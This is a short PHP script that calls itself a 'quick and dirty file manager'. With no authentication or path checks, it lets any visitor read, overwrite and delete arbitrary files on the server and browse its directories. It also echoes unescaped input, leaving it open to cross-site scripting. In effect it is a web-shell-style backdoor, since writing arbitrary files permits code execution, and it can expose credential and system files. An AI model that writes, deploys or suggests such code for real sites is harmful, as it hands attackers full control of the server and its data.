<?php

// -----------------------------
// Quick and dirty file manager
// -----------------------------

if(isset($_GET['file'])) {

	if(isset($_GET['view'])) {
		echo file_get_contents($_GET['file']);
		die();
	}

	if(isset($_GET['edit'])) {
	
		if(isset($_POST['go'])){
			$z=fopen($_GET['file'], "w");
			fwrite($z, stripslashes($_POST['contents']));
			fclose($z);
			echo "done.<br />";
			die();
			
		}
		
		echo "<form action='' method='POST'>";
		echo "<textarea cols='80' rows='20' name='contents' tabindex='3' class='textinput'>".file_get_contents($_GET['file'])."</textarea><br />";
		echo "<input type='submit' name='go' value='save'>";
		die();
	}
	
	if(isset($_GET['del'])) {

		@fopen($_GET['file'], "w");
		@unlink($_GET['file']);
		
			echo "done.<br />";
			die();
	}
	
echo "File:". $_GET['file'];
echo "<br />";
echo "[ <a href='{$_SERVER['PHP_SELF']}?view=1&file={$_GET['file']}'>View</a> | <a href='{$_SERVER['PHP_SELF']}?edit=1&file={$_GET['file']}'>Edit</a> | <a href='{$_SERVER['PHP_SELF']}?del=1&file={$_GET['file']}'>Delete</a> ]";

die();
}

$dir = $_GET['dir'];

if(!$_GET['dir']) $dir='./';
		$o=opendir($dir);
		while($f=readdir($o)) {
		if ($f!="."&&$f!=".."&&$f!=".htaccess") {

		$full_file_path = $dir."/".$f;

		$bs = filesize($full_file_path);

		if(is_dir($dir."/".$f)) {
		echo "<a href='{$_SERVER['PHP_SELF']}?dir={$full_file_path}'>$f</a> <br />";
		} else {
		echo "<a href='{$_SERVER['PHP_SELF']}?file={$full_file_path}'>$f</a> ($bs bytes)<br />";
		}
	}
}

echo "<br /><b>dir: $dir</b>";
?>